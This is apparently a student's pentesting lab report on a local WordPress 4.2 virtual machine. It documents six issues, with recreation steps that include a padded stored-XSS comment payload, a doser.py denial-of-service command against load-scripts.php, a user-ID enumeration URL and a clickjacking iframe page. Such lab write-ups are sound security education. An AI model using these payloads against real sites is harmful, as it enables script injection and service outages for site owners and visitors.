# Codepath Week7: Wordpress
# Project 7 - WordPress Pentesting

Time spent: **24** hours spent in total

> Objective: Find, analyze, recreate, and document vulnerabilities affecting an old version of WordPress

## Pentesting Report

### 1. WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary:
		1. A comment which exceeds 64 kb of data to a post will cause the HTML to no longer be 'well formed', allowing a malicious script to be inserted.  
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/XssWeek7.gif)
  - [ ] Steps to recreate: 
		1. Over 64kb of data must be sent in the comment, achieved by padding the comment with over 64000 'X's . 
		2. The script is thus: <a title='x onmouseover=alert(unescape(/hello%20dallens/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px --64000Xs--'></a>
		3. Post this code as a comment and a persistent XSS dialog box will display.
  - [ ] Affected source code:
    - [change 32299](https://core.trac.wordpress.org/changeset/32299)
### 2. WordPress <= 4.9.4 - Unauthenticated Page Request Application Denial of Service (DoS) (unpatched)
  - [ ] Summary: 
		1. An unauthenticated request to to all Wordpress stored javascripts that is uneccesary for site functionality can be leveraged for a DOS, causing the server to be unresponsive.
    - Vulnerability types: DOS/Improper Authentication
    - Tested in version: 4.2
    - Fixed in version: Unpatched 
  - [ ] GIF Walkthrough:![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/UnauthenticatedDOSFinal.gif)
  - [ ] Steps to recreate: 
		1. Use a script to generate multiple requests (https://github.com/Quitten/doser.py/blob/master/doser.py) and a specially crafted payload requesting all stored javascript modules is launched from the attacker's machine.
		2. ```python doser.py -g 'http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999```
  - [ ] Affected source code:
    - [Wordpress scriptloader](https://github.com/WordPress/WordPress/blob/master/wp-includes/script-loader.php)
### 3. Unauthenticated Valid User ID Enumeration
  - [ ] Summary:
		1. A user which does not have user edit permissions may manipulate the URL to enumerate valid user IDs  
    - Vulnerability types: URL Manipulation / User Enumeration
    - Tested in version: 4.2
    - Fixed in version: N/A
  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/UnauthenticatedUser_Enumeration.gif)
  - [ ] Steps to recreate: 
		1. Log in as user with access to WP-Admin but no user modification priviledges 
		2. Insert the following as a URL: http://wpdistillery.vm/wp-admin/user-edit.php?user_id=2&wp_http_referer=%2Fwp-admin%2Fusers.php
		3. Change the host/server address to you own and iterate through the user IDs. Move from "you do not have permission" to "user ID not valid" to enumerate the range of valid IDs. 
  - [ ] Affected source code:
    - [source_file](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 4. http://wpdistillery.vm/readme.html exposes version number
  - [ ] Summary: 
		1. The Wordpress version is exposed via an unauthenticated request to the README file.
    - Vulnerability types: Fingerprinting or Enumeration
    - Tested in version: 4.2
    - Fixed in version: (unfixed)
  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/README_VersionFingerprinting.gif)
  - [ ] Steps to recreate: 
		1. Navigate to http://wpdistillery.vm/readme.html
		2. Wordpress version is exposed without any authentication or effort by an attacker.
  - [ ] Affected source code:
    - [source_file](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. WordPress <= 4.2 - ClickJacking
  - [ ] Summary:
		1. A comment containing an embedded iframe displaying a working page on the wpdistillery.vm (Wordpress 4.2) can be posted. This proves that there are no clockjacking protections implemented in Wordpress 4.2
    - Vulnerability types: ClickJacking
    - Tested in version: 4.2
    - Fixed in version: Unknown
  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/ClickJacking.gif)
  - [ ] Steps to recreate: 
		1. Using the testing script provided by OWASP (https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)), a comment can be posted to a wordpress post that will display the iframe. 
		2. The script is:
```
<html>
   <head>
     <title>Clickjack test page</title>
   </head>
   <body>
     <p>Website is vulnerable to clickjacking!</p>
     <iframe src="http://wpdistillery.vm" width="500" height="500"></iframe>
   </body>
</html>
```
		3. Success requires posting as a user with admin priviledges, limiting the severity/risk of the attack.
  - [ ] Affected source code:
    - [source_file](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 6. WordPress <= 4.2 - Moderation Bypass: Implicit approval of subsequent subscriber comments
  - [ ] Summary:
		1. A comment by a subscriber typically needs approval by a moderator. However, a vulnerability exists such that a single comment approval my a moderator implicitly approves all subsequent comments made by that subscriber, bypassing moderation.
    - Vulnerability types: Privilege Escalation
    - Tested in version: 4.2
    - Fixed in version: Unknown
  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek7Wordpress/blob/master/Escalation.gif)
  - [ ] Steps to recreate: 
		1. As a user with subscriber privileges, post one or more comments to a post. 
		2. As an administrator, or one with comment approval privileges, approve one of the subscriber's comments. 
		3. The subscriber may then post any additional comments with implicit approval (bypassing moderation entirely).
  - [ ] Affected source code:
    - [edit-comments.php](https://core.trac.wordpress.org/browser/trunk/src/wp-admin/edit-comments.php)
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright 2018

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
